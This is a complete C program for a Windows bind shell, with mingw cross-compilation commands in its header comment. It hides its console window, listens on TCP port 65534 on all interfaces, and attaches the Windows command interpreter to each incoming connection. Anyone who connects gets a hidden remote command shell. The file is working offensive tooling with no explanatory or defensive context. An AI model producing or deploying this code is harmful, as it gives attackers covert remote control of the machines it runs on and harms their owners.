/// <summary>
/// Windows Bind Shell
/// apt-get install  mingw-w64
/// i686-w64-mingw32-gcc reverse-windows-shell.c -lws2_32 -o shell.exe
/// </summary>
#include <winsock2.h>
#pragma comment(lib,"ws2_32") 
#include <stdio.h> 
#define TRUE  (1==1)
#define FALSE (!TRUE)

/// <summary>
/// Main Function
/// </summary>
int main(int argc, char ** argv)
{
	/* Console */
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	WSADATA WSAData;
	SOCKADDR_IN sin;
	SOCKET sock;
	WSAStartup(MAKEWORD(2, 0), &WSAData);

	/* Socket */
	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons((u_short)65534);

	/* Bind Socket */
	bind(sock, (SOCKADDR *)&sin, sizeof(SOCKADDR_IN));
	listen(sock, SOMAXCONN);

	/* Loop */
	while (TRUE)
	{
		/* Connect */
		SOCKET tmp = accept(sock, 0, 0);
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		char buff[2010];

		/* Console Output */
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		si.hStdOutput = (HANDLE)tmp;
		si.hStdError = (HANDLE)tmp;
		si.hStdInput = (HANDLE)tmp;

		/* Create Process */
		GetEnvironmentVariable("COMSPEC", buff, 2000);
		CreateProcess(buff, 0, 0, 0, TRUE, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);

		/* Close Socket */
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		closesocket(tmp);
	}

	return(0);
}

